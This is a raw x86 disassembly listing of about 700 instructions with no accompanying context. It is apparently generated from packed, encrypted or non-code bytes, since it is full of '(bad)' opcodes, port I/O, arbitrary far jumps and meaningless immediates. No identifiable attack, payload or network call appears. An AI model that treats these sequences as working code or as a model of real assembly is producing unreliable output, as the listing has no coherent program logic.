  404f54:	mov    cl,0x63
  404f56:	mov    bl,0x3d
  404f58:	add    BYTE PTR [edi],al
  404f5a:	leave  
  404f5b:	inc    edx
  404f5c:	mov    edi,0xbb287b68
  404f61:	add    ebp,eax
  404f63:	inc    esp
  404f64:	adc    al,BYTE PTR es:[ebx]
  404f67:	test   eax,0xd5d5adff
  404f6c:	gs fcomi st,st(0)
  404f6f:	inc    eax
  404f70:	ret    
  404f71:	ja     0x404f6b
  404f73:	cmp    al,0x57
  404f75:	loopne 0x404f67
  404f77:	adc    BYTE PTR ds:[ecx+0x77],bl
  404f7b:	fdivrp st(7),st
  404f7d:	aaa    
  404f7e:	scas   eax,DWORD PTR es:[edi]
  404f7f:	add    eax,0x5f394259
  404f84:	ins    BYTE PTR es:[edi],dx
  404f85:	out    dx,al
  404f86:	dec    eax
  404f87:	adc    BYTE PTR [esi+0x246beab6],bh
  404f8d:	sub    al,0x62
  404f8f:	add    al,0x79
  404f91:	rcl    BYTE PTR [ebp+0x4160ae9f],1
  404f97:	xor    ah,ch
  404f99:	ds mov edi,0x25b37c4f
  404f9f:	mov    al,0x3e
  404fa1:	aas    
  404fa2:	add    bh,BYTE PTR [edi-0x45]
  404fa5:	dec    esi
  404fa6:	push   eax
  404fa7:	cld    
  404fa8:	xchg   edx,eax
  404fa9:	jmp    0x8422:0x16f5e1ca
  404fb0:	jle    0x404ffc
  404fb2:	cmp    ah,al
  404fb4:	xor    DWORD PTR ds:0x4ef261cf,ebp
  404fba:	pop    ecx
  404fbb:	test   eax,0x6819af1b
  404fc0:	cmp    bh,bh
  404fc2:	inc    ebx
  404fc3:	lea    ecx,[ecx+ebp*8-0x6b6cdcce]
  404fca:	jl     0x404f83
  404fcc:	das    
  404fcd:	out    dx,al
  404fce:	imul   eax,DWORD PTR [edx+0x52],0xffffffa8
  404fd2:	cld    
  404fd3:	dec    ecx
  404fd4:	lock or eax,0x3a8120db
  404fda:	xchg   ebp,eax
  404fdb:	mul    DWORD PTR ss:[edi]
  404fde:	sub    DWORD PTR [esi],ebp
  404fe0:	aam    0xdf
  404fe2:	mov    al,0x9e
  404fe4:	and    BYTE PTR [edx-0x2c],bh
  404fe7:	ret    0x6f2a
  404fea:	daa    
  404feb:	inc    esi
  404fec:	or     BYTE PTR [ebx+0x2a],ch
  404fef:	call   0x5e4:0xc11728e4
  404ff6:	jns    0x40501f
  404ff8:	std    
  404ff9:	jmp    0x7a56:0xe90929cd
  405000:	dec    eax
  405001:	scas   eax,DWORD PTR es:[edi]
  405002:	mov    BYTE PTR [edi+0x78],al
  405005:	call   0xc4ce:0x6dcbf8f7
  40500c:	cmp    BYTE PTR [edi],dl
  40500e:	in     eax,0x15
  405010:	cmp    DWORD PTR [eax*4-0x2315e814],esp
  405017:	add    bh,BYTE PTR [esi-0x26]
  40501a:	jnp    0x40506b
  40501c:	mov    ds:0x96f55cf0,al
  405021:	out    dx,al
  405022:	xor    esi,DWORD PTR [edi+eax*8-0x37]
  405026:	and    DWORD PTR [ebx+0x15],ebp
  405029:	xchg   edx,eax
  40502a:	outs   dx,BYTE PTR ds:[esi]
  40502b:	ins    DWORD PTR es:[edi],dx
  40502c:	cs lea esi,cs:[edx]
  405030:	ds es retf 0x133c
  405035:	out    dx,al
  405036:	dec    ebx
  405037:	xchg   ebx,eax
  405038:	out    0xbe,eax
  40503a:	adc    DWORD PTR [ebx+0xbed597b],eax
  405040:	sub    BYTE PTR [edi-0x64a13447],cl
  405046:	popf   
  405047:	mov    ecx,0x6ab030f5
  40504c:	pop    ecx
  40504d:	iret   
  40504e:	xor    ah,al
  405050:	outs   dx,DWORD PTR ds:[esi]
  405051:	push   0xffffffe4
  405053:	push   ecx
  405054:	pop    esp
  405055:	adc    ah,BYTE PTR [ecx-0x14]
  405058:	pop    edx
  405059:	sub    DWORD PTR [eax+ebp*2],ebx
  40505c:	jns    0x4050dd
  40505e:	dec    ecx
  40505f:	mov    dh,0x1c
  405061:	pop    esp
  405062:	jb     0x405059
  405064:	nop
  405065:	out    dx,eax
  405066:	jb     0x405034
  405068:	mov    DWORD PTR [ebx-0x52],ebx
  40506b:	fwait
  40506c:	sbb    ecx,DWORD PTR [ebp-0x36fd2a1]
  405072:	adc    al,0x9
  405074:	repz in al,dx
  405076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405077:	pop    eax
  405078:	arpl   WORD PTR [esi+eiz*8+0x5e039e45],sp
  40507f:	fdivr  st(4),st
  405081:	push   es
  405082:	and    esp,DWORD PTR [esi]
  405084:	sbb    eax,0x6a661ef7
  405089:	(bad)  
  40508b:	(bad)  
  40508d:	dec    esp
  40508e:	into   
  40508f:	dec    esi
  405090:	xor    edx,esi
  405092:	and    ebx,DWORD PTR [ebx+0x3f336f68]
  405098:	mov    edx,0x7a389726
  40509d:	push   0x44
  40509f:	popa   
  4050a0:	pop    ebp
  4050a1:	ror    al,0xa1
  4050a4:	stc    
  4050a5:	inc    esp
  4050a6:	pop    ebx
  4050a7:	out    dx,al
  4050a8:	xor    eax,DWORD PTR [ebx+0x31817ff0]
  4050ae:	mov    esi,0x70956b94
  4050b3:	mov    esp,DWORD PTR [ecx]
  4050b5:	pop    ss
  4050b6:	pop    ds
  4050b7:	adc    al,0x43
  4050b9:	pop    edi
  4050ba:	gs mov eax,esi
  4050bd:	push   esi
  4050be:	cmp    eax,0x9e6b70d8
  4050c3:	test   eax,0x95d6eee0
  4050c8:	shr    DWORD PTR [ebx-0x64fca721],0x57
  4050cf:	(bad)  
  4050d0:	mov    eax,0xc74030e7
  4050d5:	mov    bl,0x35
  4050d7:	nop
  4050d8:	sti    
  4050d9:	push   eax
  4050da:	add    eax,0xef99a4dc
  4050df:	push   ss
  4050e0:	sbb    eax,0x6673cecc
  4050e5:	fdiv   DWORD PTR [ebp-0x14]
  4050e8:	mov    ecx,0x67bcd73b
  4050ed:	js     0x405076
  4050ef:	xor    BYTE PTR [ebx-0x68],0xa5
  4050f3:	or     al,0xa7
  4050f5:	gs dec ecx
  4050f7:	ss jnp 0x4050e1
  4050fa:	xchg   DWORD PTR [edi-0x27],esp
  4050fd:	mov    esp,0x4272b02
  405102:	aaa    
  405103:	mov    DWORD PTR [edx-0x4],esp
  405106:	cmp    bl,0x48
  405109:	mov    ds:0x20c08582,al
  40510e:	and    BYTE PTR [ebp-0x5b],0x9b
  405112:	xchg   ebp,eax
  405113:	lahf   
  405114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405115:	stos   BYTE PTR es:[edi],al
  405116:	sbb    dh,0x1f
  405119:	mov    ds:0x9c025fc1,eax
  40511e:	xchg   esp,eax
  40511f:	(bad)  
  405120:	and    DWORD PTR [ecx],eax
  405122:	dec    al
  405124:	call   DWORD PTR [edi-0x27f8b49f]
  40512a:	retf   0x5f45
  40512d:	sbb    al,0x61
  40512f:	and    al,0xdb
  405131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405132:	mov    ch,0xa8
  405134:	enter  0x8bb3,0xb6
  405138:	je     0x4050d0
  40513a:	dec    edi
  40513b:	add    DWORD PTR [ebx],esp
  40513d:	rcl    BYTE PTR [edx-0x2dba8a3],1
  405143:	scas   al,BYTE PTR es:[edi]
  405144:	sbb    BYTE PTR [edx-0x6a20b660],cl
  40514a:	jg     0x405137
  40514c:	scas   eax,DWORD PTR es:[edi]
  40514d:	fst    QWORD PTR [ebx-0x6c]
  405150:	jle    0x405117
  405152:	shl    BYTE PTR [edx],cl
  405154:	push   0x5198df78
  405159:	xchg   esp,eax
  40515a:	lds    eax,FWORD PTR [edx+ebx*1+0x2]
  40515e:	mov    BYTE PTR [eax-0x1d],bh
  405161:	xor    al,0xb0
  405163:	fnstsw WORD PTR [ebp+0x7fdc5d80]
  405169:	jl     0x405101
  40516b:	clc    
  40516c:	inc    edi
  40516d:	mov    WORD PTR [edi+ebp*2],fs
  405170:	ret    
  405171:	pop    ecx
  405172:	(bad)  
  405173:	jne    0x40511e
  405175:	add    eax,0x48fa7194
  40517a:	push   ebx
  40517b:	mov    ecx,0xbca04ebe
  405180:	imul   ebx,edi,0xffffff83
  405183:	pop    ebx
  405184:	adc    esp,DWORD PTR [esi-0x61]
  405187:	std    
  405188:	nop
  405189:	es enter 0xc027,0x7
  40518e:	dec    edx
  40518f:	mov    eax,0x3d1ac7c5
  405194:	cmp    edi,DWORD PTR [esi-0x741f218d]
  40519a:	jl     0x4051c8
  40519c:	lds    ebp,FWORD PTR [edi]
  40519e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40519f:	xor    BYTE PTR [esi-0x5e],0xdb
  4051a3:	pop    ebp
  4051a4:	lds    ebp,FWORD PTR [ebx]
  4051a6:	jle    0x4051b1
  4051a8:	test   dh,ch
  4051aa:	dec    esp
  4051ab:	fild   QWORD PTR [esi+0x1d]
  4051ae:	mov    edi,0x8e355fe6
  4051b3:	in     eax,dx
  4051b4:	xchg   DWORD PTR [ebx+ebx*4+0x75],ebx
  4051b8:	loop   0x40521e
  4051ba:	push   ebx
  4051bb:	push   ebx
  4051bc:	push   edi
  4051bd:	xchg   ebp,eax
  4051be:	xchg   ebx,eax
  4051bf:	clc    
  4051c0:	add    BYTE PTR gs:[esi-0x51],ch
  4051c4:	test   eax,0xec4c3a57
  4051c9:	xor    dl,bl
  4051cb:	scas   eax,DWORD PTR es:[edi]
  4051cc:	scas   al,BYTE PTR es:[edi]
  4051cd:	js     0x4051b9
  4051cf:	or     DWORD PTR [edi],0x24f7bea
  4051d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d6:	add    dh,bh
  4051d8:	sbb    eax,0x670f7c61
  4051dd:	cmp    DWORD PTR [ebx],ebx
  4051df:	mov    ebx,0x4c0a77dc
  4051e4:	cmp    ecx,DWORD PTR [edx+0xefeeb1e]
  4051ea:	mov    ax,ds:0xf223532d
  4051f0:	sbb    BYTE PTR [eax+0x2e],0x23
  4051f4:	fwait
  4051f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051f6:	adc    edx,0x59f3cb0b
  4051fc:	clc    
  4051fd:	int3   
  4051fe:	lds    edx,FWORD PTR [edi]
  405200:	xchg   ebx,eax
  405201:	dec    edx
  405202:	sbb    eax,0xea196a14
  405207:	aam    0x13
  405209:	xchg   edi,eax
  40520a:	mov    ds:0xbc654ff4,eax
  40520f:	retf   0x5946
  405212:	lea    ecx,[ecx-0x61]
  405215:	or     al,dh
  405217:	mov    eax,0xfa77e413
  40521c:	mov    bl,0x80
  40521e:	adc    edi,0x37034761
  405224:	cmp    ch,BYTE PTR [ebx+0x2a]
  405227:	and    eax,0xf8c065b6
  40522c:	dec    eax
  40522d:	jmp    0x4051d1
  40522f:	dec    esi
  405230:	in     al,dx
  405231:	retf   0xd702
  405234:	iret   
  405235:	nop
  405236:	je     0x4052b6
  405238:	or     al,0x7a
  40523a:	int    0xec
  40523c:	pop    ebp
  40523d:	std    
  40523e:	fdiv   QWORD PTR [edx]
  405240:	mov    eax,ds:0x3520487
  405245:	push   cs
  405246:	dec    edx
  405247:	push   0xffffffd3
  405249:	jne    0x4052b7
  40524b:	out    dx,eax
  40524c:	and    eax,ecx
  40524e:	fwait
  40524f:	inc    edx
  405250:	sbb    al,al
  405252:	fs mov ah,0x12
  405255:	mov    esi,0xc45d9b60
  40525a:	jl     0x40528b
  40525c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40525d:	adc    ebp,DWORD PTR [edi-0x2e]
  405260:	inc    edi
  405261:	or     eax,0xd9deb3a8
  405266:	xor    DWORD PTR [eax-0x50],0xc80ab0ff
  40526d:	and    BYTE PTR [ecx+0x75],bl
  405270:	sub    esi,ecx
  405272:	aaa    
  405273:	inc    eax
  405274:	in     al,dx
  405275:	cwde   
  405276:	jb     0x405206
  405278:	fist   WORD PTR [edi+0x28593f20]
  40527e:	sub    bh,al
  405280:	sub    esi,esp
  405282:	jne    0x405300
  405284:	stos   BYTE PTR es:[edi],al
  405285:	add    DWORD PTR [ecx-0x26cbd620],edi
  40528b:	push   0xffffffb3
  40528d:	xor    eax,0x2e9eea9b
  405292:	mov    WORD PTR [ecx],?
  405294:	xchg   ebx,eax
  405295:	or     DWORD PTR [ebx+0x69],eax
  405298:	ja     0x4052be
  40529a:	xor    ebp,DWORD PTR [esi+0x67635b40]
  4052a0:	mov    esi,0x6860ba99
  4052a5:	adc    DWORD PTR [ebx-0x53],ecx
  4052a8:	dec    esp
  4052a9:	mov    BYTE PTR fs:[esi-0x4e77656a],cl
  4052b0:	retf   0xe374
  4052b3:	mov    dl,0x8f
  4052b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052b6:	jne    0x405318
  4052b8:	sbb    al,0xa5
  4052ba:	pop    edi
  4052bb:	sbb    esp,DWORD PTR [edx]
  4052bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052be:	jnp    0x4052fc
  4052c0:	push   ss
  4052c1:	jae    0x405291
  4052c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052c4:	mov    eax,ds:0xc43d1575
  4052c9:	xacquire xchg BYTE PTR [edx],al
  4052cc:	scas   al,BYTE PTR es:[edi]
  4052cd:	fdiv   st,st(6)
  4052cf:	push   0x395b403b
  4052d4:	into   
  4052d5:	jmp    0x405268
  4052d7:	popf   
  4052d8:	jge    0x405310
  4052da:	fistp  QWORD PTR [edx+ebx*2+0x7d]
  4052de:	push   eax
  4052df:	ins    DWORD PTR es:[edi],dx
  4052e0:	pop    ecx
  4052e1:	pop    esp
  4052e2:	lea    edx,[edi]
  4052e4:	loope  0x4052d1
  4052e6:	push   ebp
  4052e7:	and    DWORD PTR [ecx+esi*4],eax
  4052ea:	(bad)  
  4052eb:	jmp    0xb4163944
  4052f0:	jl     0x40532f
  4052f2:	inc    ebp
  4052f3:	not    edi
  4052f5:	retf   0x9675
  4052f8:	jb     0x4052f0
  4052fa:	adc    al,0x6c
  4052fc:	(bad)  
  4052fd:	jp     0x4052b8
  4052ff:	and    eax,0x650bbb89
  405304:	mov    dh,BYTE PTR es:[ecx+0x30a5b31b]
  40530b:	jl     0x405327
  40530d:	ins    BYTE PTR es:[edi],dx
  40530e:	dec    eax
  40530f:	or     dl,BYTE PTR [esi]
  405311:	sbb    eax,0x7d943ce5
  405316:	pop    edi
  405317:	push   ecx
  405318:	repz pop es
  40531a:	mov    ecx,0x9f315ba6
  40531f:	xor    DWORD PTR [ebx+eiz*4],ebx
  405322:	sub    eax,0x9d6127ef
  405327:	xor    BYTE PTR ds:0x125d8ee9,ah
  40532d:	in     eax,0xbd
  40532f:	push   ebx
  405330:	mov    esi,0x9f17f8b1
  405335:	addr16 (bad) 
  405337:	push   ebx
  405338:	adc    BYTE PTR [ebx-0x6d],0xa0
  40533c:	jbe    0x4052d9
  40533e:	jne    0x405347
  405340:	add    eax,0x4ad12c3a
  405345:	push   es
  405346:	mul    esi
  405348:	aam    0xb3
  40534a:	outs   dx,BYTE PTR ds:[esi]
  40534b:	push   edx
  40534c:	adc    al,0x3d
  40534e:	rcl    dl,cl
  405350:	ret    
  405351:	data16 ja 0x405399
  405354:	add    al,0x74
  405356:	or     dl,BYTE PTR [edi-0x4]
  405359:	outs   dx,DWORD PTR ds:[esi]
  40535a:	pop    ebx
  40535b:	leave  
  40535c:	dec    edi
  40535d:	aad    0x4b
  40535f:	cs xchg esp,eax
  405361:	mov    eax,0xc0235cd
  405366:	xchg   ebx,eax
  405367:	cmp    BYTE PTR [edi],ch
  405369:	pop    ecx
  40536a:	test   edi,edi
  40536c:	and    eax,0x4113a06
  405371:	pop    ss
  405372:	sub    ecx,ebp
  405374:	sti    
  405375:	cmp    BYTE PTR [ebx],cl
  405377:	mov    ch,0x42
  405379:	push   DWORD PTR [ecx]
  40537b:	jl     0x405383
  40537d:	in     al,0x14
  40537f:	push   ebp
  405380:	push   esp
  405381:	cmc    
  405382:	xchg   BYTE PTR [ecx+0x1d835171],dl
  405388:	mov    eax,0x811a49b3
  40538d:	inc    ebx
  40538e:	je     0x405359
  405390:	push   ebx
  405391:	or     edx,eax
  405393:	std    
  405394:	push   ebp
  405395:	xor    al,dl
  405397:	dec    esp
  405398:	push   ecx
  405399:	and    ah,bh
  40539b:	gs dec esi
  40539d:	iret   
  40539e:	pop    edi
  40539f:	push   esi
  4053a0:	pop    ebp
  4053a1:	xchg   esp,eax
  4053a2:	popa   
  4053a3:	out    dx,eax
  4053a4:	out    dx,eax
  4053a5:	adc    BYTE PTR [eax-0x26],dl
  4053a8:	adc    esi,DWORD PTR gs:[esi+edi*1-0x7c]
  4053ad:	cmp    BYTE PTR [ecx+0x73a78268],cl
  4053b3:	popf   
  4053b4:	enter  0x617,0x73
  4053b8:	mov    esi,0xc549866d
  4053bd:	cwde   
  4053be:	adc    BYTE PTR [esi-0x674223e4],ah
  4053c4:	js     0x405411
  4053c6:	jnp    0x4053ae
  4053c8:	sbb    ecx,esi
  4053ca:	in     eax,0x95
  4053cc:	daa    
  4053cd:	arpl   di,sp
  4053cf:	fistp  DWORD PTR [ebx]
  4053d1:	fstp   st(4)
  4053d3:	ds adc eax,0xb95d1d47
  4053d9:	leave  
  4053da:	into   
  4053db:	inc    eax
  4053dc:	jmp    0x47d7:0x5896d906
  4053e3:	adc    DWORD PTR [ebp+edi*2-0x71],eax
  4053e7:	add    al,bl
  4053e9:	sbb    eax,0x5e42998
  4053ee:	sti    
  4053ef:	sbb    ah,ch
  4053f1:	add    al,0x27
  4053f3:	push   ss
  4053f4:	or     eax,0x259bae5c
  4053f9:	shl    ebp,0x39
  4053fc:	(bad)  
  4053fd:	in     eax,dx
  4053fe:	imul   ecx,DWORD PTR [ebx],0xaa7ecf7e
  405404:	cmp    DWORD PTR [edx+eiz*1],0xffffffd5
  405408:	pop    ebx
  405409:	loop   0x405477
  40540b:	sub    eax,0xef67ab7e
  405410:	mov    ebx,0xbcc7a1b1
  405415:	or     DWORD PTR [ebp-0x1a],ebp
  405418:	mov    edi,0x987bc8fa
  40541d:	fidiv  DWORD PTR [ebx-0x169ed0a0]
  405423:	ss cmp al,0x2f
  405426:	and    ch,al
  405428:	inc    edi
  405429:	mov    ah,0x60
  40542b:	adc    al,bl
  40542d:	cli    
  40542e:	mov    dh,0x47
  405430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405431:	xor    al,0x6f
  405433:	int3   
  405434:	fcmovnb st,st(6)
  405436:	sub    ebp,edx
  405438:	(bad)  
  405439:	fidiv  DWORD PTR [eax]
  40543b:	mov    dl,0xc5
  40543d:	ja     0x4054b1
  40543f:	or     eax,0x9ae954e5
  405444:	inc    eax
  405445:	aas    
  405446:	pusha  
  405447:	add    DWORD PTR [esi],edi
  405449:	add    esp,DWORD PTR [ecx+0x77279198]
  40544f:	sbb    ebp,DWORD PTR [edi-0x1]
  405452:	stos   BYTE PTR es:[edi],al
  405453:	sub    DWORD PTR [edi-0x7f],0x37
  405457:	mov    ecx,0x8b60c562
  40545c:	into   
  40545d:	rol    BYTE PTR [ebp+ebp*8-0x71],cl
  405461:	aaa    
  405462:	pop    ebp
  405463:	mov    eax,0xc49f450a
  405468:	push   ecx
  405469:	pop    ecx
  40546a:	(bad)  
  40546b:	daa    
  40546c:	xchg   BYTE PTR [ebx+edi*4-0x4ae59e35],bh
  405473:	mov    edi,0x75397faf
  405478:	jg     0x405413
  40547a:	push   ebx
  40547b:	cmp    DWORD PTR [ecx-0x2cb207c],0x2acccc28
  405485:	mov    esp,0xf9a14a8f
  40548a:	sbb    al,0x98
  40548d:	dec    eax
  40548e:	cli    
  40548f:	xchg   edx,eax
  405490:	mov    DWORD PTR [ebx+0x445b8ae8],esp
  405496:	repnz gs pop ebp
  405499:	lea    esi,[ecx]
  40549b:	mov    bl,0x4c
  40549d:	cmp    edx,edx
  40549f:	mov    ebx,0xeb056d16
  4054a4:	test   BYTE PTR [edx+0x2a8c46e2],dl
  4054aa:	ins    DWORD PTR es:[edi],dx
  4054ab:	cmp    eax,0x7adaee51
  4054b0:	ins    DWORD PTR es:[edi],dx
  4054b1:	jecxz  0x4054dc
  4054b3:	xor    DWORD PTR [ebp-0x22a21fee],edi
  4054b9:	in     eax,0x14
  4054bb:	out    dx,al
  4054bc:	dec    edx
  4054bd:	js     0x40544d
  4054bf:	and    eax,0x6287b85d
  4054c4:	lock inc edi
  4054c6:	mov    bh,0x3b
  4054c8:	(bad)  
  4054c9:	cdq    
  4054ca:	adc    DWORD PTR [edi+0x55],ebx
  4054cd:	mov    ah,0xe4
  4054cf:	cmp    DWORD PTR [eax],eax
  4054d1:	sub    BYTE PTR [esi-0x134ca416],0xdb
  4054d8:	adc    al,BYTE PTR [esp+esi*2-0x5b]
  4054dc:	mov    ebx,0xed29474b
  4054e1:	retf   
  4054e2:	popa   
  4054e3:	mov    eax,0xb23576d
  4054e8:	jmp    FWORD PTR ds:0x1f4469b9
  4054ee:	push   0xfffffff6
  4054f0:	call   0x3e7216eb
  4054f5:	loopne 0x40556e
  4054f7:	sar    BYTE PTR [esi+0x17],cl
  4054fa:	inc    eax
  4054fb:	inc    ebp
  4054fc:	sbb    al,0xb8
  4054fe:	sub    BYTE PTR ds:0x4771f90d,ch
  405504:	ret    
  405505:	or     BYTE PTR ds:0x4da5f6f6,cl
  40550b:	and    BYTE PTR [ebx-0x50],0x4e
  40550f:	jge    0x40558d
  405511:	retf   
  405512:	xchg   edx,eax
  405513:	push   ebx
  405514:	ret    
  405515:	fild   WORD PTR [ecx*1+0x72db1113]
  40551c:	jg     0x4054dd
  40551e:	aad    0x90
  405520:	lock hlt 
  405522:	jnp    0x4054e6
  405524:	jae    0x4054f5
  405526:	and    al,0x27
  405528:	mov    ds:0xf3fc7dcc,eax
  40552d:	dec    eax
  40552e:	in     eax,0xcb
  405530:	repz (bad)
  405533:	pop    ecx
  405534:	fimul  DWORD PTR [ebx-0x16b5a6e0]
  40553a:	cmp    dl,BYTE PTR [eax-0x5aef4a29]
  405540:	lahf   
  405541:	sahf   
  405542:	stos   BYTE PTR es:[edi],al
  405543:	dec    edx
  405544:	add    edi,edx
  405546:	lahf   
  405547:	es sbb al,0xd4
  40554a:	(bad)  
  40554c:	test   eax,0xf0be3f44
  405551:	cmp    al,0xee
  405553:	in     eax,dx
  405554:	pushf  
  405555:	mov    bl,0xf5
  405557:	jo     0x4055cc
  405559:	mov    fs,WORD PTR [edx-0x64f49227]
  40555f:	div    BYTE PTR [eax-0x146cb18d]
  405565:	pop    edi
  405566:	and    DWORD PTR [edx+0x6861d1b1],esp
  40556c:	pop    esi
  40556d:	push   ebp
  40556e:	mov    eax,0xd6a949f
  405573:	test   cl,dh
  405575:	retf   0x260c
  405578:	xchg   esi,eax
  405579:	sti    
  40557a:	lods   eax,DWORD PTR ds:[esi]
  40557b:	fnsave [ebx-0x58]
  40557e:	xchg   esp,eax
  40557f:	pusha  
  405580:	in     eax,dx
  405581:	into   
  405582:	sar    BYTE PTR [esi+ebp*8+0x3d9a1711],0xa6
  40558a:	daa    
  40558b:	lods   al,BYTE PTR ds:[esi]
  40558c:	dec    eax
  40558d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40558e:	cmp    DWORD PTR [ecx+0x72],eax
  405591:	jge    0x405513
  405593:	xor    BYTE PTR [eax-0x39984f83],cl
  405599:	and    al,0xab
  40559b:	cmp    BYTE PTR [ebx],cl
  40559d:	mov    ah,0x54
  40559f:	adc    ch,dh
  4055a1:	inc    edi
  4055a2:	sbb    ebp,edx
  4055a4:	jge    0x40559d
  4055a6:	dec    DWORD PTR [ebx+0x3cf2d9e8]
  4055ac:	sub    cl,BYTE PTR [edi+0x1a]
  4055af:	mov    WORD PTR [eax+0x1f],ds
  4055b2:	pop    esp
  4055b3:	addr16 pop ecx
  4055b5:	pop    esi
  4055b6:	mov    edx,0xacd09df9
  4055bb:	clc    
  4055bc:	jns    0x40555d
  4055be:	or     DWORD PTR [ecx+eiz*4],eax
  4055c1:	pop    esp
  4055c2:	adc    BYTE PTR [eax-0x3563118b],bh
  4055c8:	cli    
  4055c9:	sub    bh,ah
  4055cb:	lds    ebx,FWORD PTR [ecx]
  4055cd:	ret    
  4055ce:	pushf  
  4055cf:	int    0xea
  4055d1:	(bad)  
  4055d2:	sbb    ebp,ebx
  4055d4:	mov    ds:0xa2af1fc,eax
  4055d9:	fild   WORD PTR [esi-0x7801bf8d]
  4055df:	mov    bh,BYTE PTR [esp+ebp*8]
  4055e2:	sbb    edx,DWORD PTR [esi-0x64]
  4055e5:	or     ch,BYTE PTR [ebp*4+0x4f8e83ad]
  4055ec:	or     esp,DWORD PTR [edi-0x7f67a387]
  4055f2:	test   ebx,0x24d92c91
  4055f8:	jle    0x4055e0
  4055fa:	pop    esi
  4055fb:	add    esp,DWORD PTR [edx-0x4d6d6506]
  405601:	stos   DWORD PTR es:[edi],eax
  405602:	sbb    eax,0x8f5d8153
  405607:	ins    DWORD PTR es:[edi],dx
  405608:	arpl   cx,sp
  40560a:	ja     0x4055ff
  40560c:	sbb    bh,al
  40560e:	sub    ah,BYTE PTR [ebx-0x7]
  405611:	int3   
  405612:	pop    ss
  405613:	cmp    DWORD PTR [esi+0x68],esp
  405616:	mov    dl,0x5a
  405618:	rol    BYTE PTR [esi-0x270a70bc],cl
  40561e:	pop    esp
  40561f:	add    eax,0xe7ff85a7
  405624:	xor    al,al
  405626:	xor    al,0xb2
  405628:	xchg   DWORD PTR [ecx+0x43b4151e],edi
  40562e:	and    BYTE PTR [eax],bl
  405630:	sbb    BYTE PTR [edx],bh
  405632:	dec    ebp
  405633:	pop    ebx
  405634:	lock inc esi
  405636:	pop    ds
  405637:	add    DWORD PTR [ebx+0x7bea6eba],edx
  40563d:	pop    esi
  40563e:	or     BYTE PTR [edx+0x68592fdc],cl
  405644:	nop
  405645:	sbb    ebp,edi
  405647:	fist   DWORD PTR [eax+0x36043432]
  40564d:	xchg   ebx,eax
  40564e:	xor    cl,BYTE PTR [ebp+0x4c85841b]
  405654:	adc    eax,0x9224bfb6
  405659:	sub    BYTE PTR [ebx-0x70],al
  40565c:	mov    bh,0xdd
  40565e:	and    DWORD PTR [ebx],edx
  405660:	icebp  
  405661:	clc    
  405662:	addr16 das 
  405664:	jge    0x405677
  405666:	dec    ecx
  405667:	fnstenv [esi-0x3d]
  40566a:	(bad)  
  40566b:	call   FWORD PTR [edx-0x2d]
  40566e:	loop   0x405630
  405670:	test   eax,0xae2d6b1e
  405675:	push   eax
  405676:	cmp    BYTE PTR [ebx],cl
  405678:	call   0x41d8:0x6e408cf3
  40567f:	jmp    0x49c903e6
  405684:	adc    BYTE PTR [ecx+0x309fcc2],bh
  40568a:	fdiv   DWORD PTR [ebx-0x473a7a1a]
  405690:	call   0xaea9:0x3864c099
  405697:	xchg   esp,eax
  405698:	dec    ecx
  405699:	aam    0xb1
  40569b:	enter  0x48cf,0x65
  40569f:	pop    ebx
  4056a0:	add    dh,bl
  4056a2:	int    0x2
  4056a4:	fwait
  4056a5:	add    DWORD PTR [ebx-0x47],0xe8da4f79
  4056ac:	cmp    al,0x7c
  4056ae:	ret    
  4056af:	jg     0x40568c
  4056b1:	rcl    DWORD PTR [edx+0x68911707],0x61
  4056b8:	xor    ebx,DWORD PTR [edx-0x49]
  4056bb:	jecxz  0x405703
  4056bd:	or     BYTE PTR ds:0xa9c33c53,ch
  4056c3:	mov    al,ds:0x99c37359
  4056c8:	pop    ds
  4056c9:	das    
  4056ca:	dec    ecx
  4056cb:	ficomp DWORD PTR ds:0x6e0c63f0
  4056d1:	call   0x248c:0x73f040c8
  4056d8:	jns    0x4056f8
  4056da:	(bad)  
  4056db:	dec    esi
  4056dc:	jo     0x6df2c943
  4056e2:	push   ebp
  4056e3:	xor    al,0x2
  4056e5:	ins    BYTE PTR es:[edi],dx
  4056e6:	es sbb eax,0x5e6707f
  4056ec:	ins    BYTE PTR es:[edi],dx
  4056ed:	mov    esp,0x90560dff
  4056f2:	push   DWORD PTR [edi+0x70]
  4056f5:	pop    esp
  4056f6:	inc    ecx
  4056f7:	loopne 0x405703
  4056f9:	dec    eax
  4056fa:	pop    edx
  4056fb:	adc    al,0xe2
  4056fd:	push   eax
  4056fe:	stc    
  4056ff:	out    0x77,eax
  405701:	shl    BYTE PTR [ecx],0x86
  405704:	pop    es
  405705:	ror    BYTE PTR [ebp+0x26f625a8],cl
  40570b:	sahf   
  40570c:	xchg   ebx,eax
  40570d:	add    eax,0xfaed3219
  405712:	test   BYTE PTR [esi-0xe],dl
  405715:	pop    ss
  405716:	out    0x33,al
  405718:	inc    esp
  405719:	cli    
  40571a:	mov    gs,WORD PTR [ebp+0x7d]
  40571d:	mov    ?,WORD PTR [ebx+0x3f]
  405720:	stc    
  405721:	jmp    0xa44:0x676f039a
  405728:	push   ebx
  405729:	dec    edx
  40572a:	ins    BYTE PTR es:[edi],dx
  40572b:	sbb    DWORD PTR [ebx-0x1],ecx
  40572e:	push   esp
  40572f:	or     bl,BYTE PTR [ebx+0x23b3748b]
  405735:	add    esp,ebx
  405737:	ins    BYTE PTR es:[edi],dx
  405738:	jp     0x405706
  40573a:	adc    bl,BYTE PTR [eax]
  40573c:	dec    BYTE PTR [esi+0x4a48a100]
  405742:	add    eax,0x9bd90de8
  405747:	pop    ebp
  405748:	cmp    dl,cl
  40574a:	jo     0x4056ef
  40574c:	adc    al,0xe5
  40574e:	iret   
  40574f:	cmp    al,0x38
  405751:	test   eax,ebx
  405753:	std    
  405754:	retf   0xa470
  405757:	or     eax,0xd0f86281
  40575c:	adc    ebx,DWORD PTR [edi+0x4d8d380c]
  405762:	retf   0x8aa7
  405765:	jnp    0x40576b
  405767:	mov    cl,0x81
